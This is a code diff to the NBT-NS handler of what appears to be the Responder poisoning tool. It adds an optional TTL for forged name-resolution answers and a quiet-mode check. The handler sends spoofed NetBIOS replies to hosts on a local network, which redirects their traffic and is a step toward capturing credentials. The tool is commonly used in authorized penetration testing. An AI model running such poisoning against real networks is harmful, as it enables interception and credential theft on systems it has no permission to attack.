@@ -27,33 +27,40 @@ else:
 class NBTNS(BaseRequestHandler):
 
 	def handle(self):
+		try:
+			data, socket = self.request
+			Name = Decode_Name(NetworkRecvBufferPython2or3(data[13:45]))
+			# Break out if we don't want to respond to this host
+			if RespondToThisHost(self.client_address[0].replace("::ffff:",""), Name) is not True:
+				return None
 
-		data, socket = self.request
-		Name = Decode_Name(NetworkRecvBufferPython2or3(data[13:45]))
-		# Break out if we don't want to respond to this host
-		if RespondToThisHost(self.client_address[0].replace("::ffff:",""), Name) is not True:
-			return None
-
-		if data[2:4] == b'\x01\x10':
-			if settings.Config.AnalyzeMode:  # Analyze Mode
-				print(text('[Analyze mode: NBT-NS] Request by %-15s for %s, ignoring' % (color(self.client_address[0].replace("::ffff:",""), 3), color(Name, 3))))
-				SavePoisonersToDb({
+			if data[2:4] == b'\x01\x10':
+				if settings.Config.AnalyzeMode:  # Analyze Mode
+					# Don't print if in Quiet Mode
+					if not settings.Config.Quiet_Mode:
+						print(text('[Analyze mode: NBT-NS] Request by %-15s for %s, ignoring' % (color(self.client_address[0].replace("::ffff:",""), 3), color(Name, 3))))
+					SavePoisonersToDb({
 							'Poisoner': 'NBT-NS', 
 							'SentToIp': self.client_address[0], 
 							'ForName': Name,
 							'AnalyzeMode': '1',
-						})
-			else:  # Poisoning Mode
-				Buffer1 = NBT_Ans()
-				Buffer1.calculate(data)
-				socket.sendto(NetworkSendBufferPython2or3(Buffer1), self.client_address)
-				if not settings.Config.Quiet_Mode:
-					LineHeader = "[*] [NBT-NS]"
-					print(color("%s Poisoned answer sent to %s for name %s (service: %s)" % (LineHeader, self.client_address[0].replace("::ffff:",""), Name, NBT_NS_Role(NetworkRecvBufferPython2or3(data[43:46]))), 2, 1))
-				SavePoisonersToDb({
+							})
+				else:  # Poisoning Mode
+					if settings.Config.TTL == None:
+						Buffer1 = NBT_Ans()
+					else:
+						Buffer1 = NBT_Ans(TTL=settings.Config.TTL)
+					Buffer1.calculate(data)
+					socket.sendto(NetworkSendBufferPython2or3(Buffer1), self.client_address)
+					if not settings.Config.Quiet_Mode:
+						LineHeader = "[*] [NBT-NS]"
+						print(color("%s Poisoned answer sent to %s for name %s (service: %s)" % (LineHeader, self.client_address[0].replace("::ffff:",""), Name, NBT_NS_Role(NetworkRecvBufferPython2or3(data[43:46]))), 2, 1))
+					SavePoisonersToDb({
 							'Poisoner': 'NBT-NS', 
 							'SentToIp': self.client_address[0], 
 							'ForName': Name,
 							'AnalyzeMode': '0',
-						})
+							})
+		except:
+			raise
 
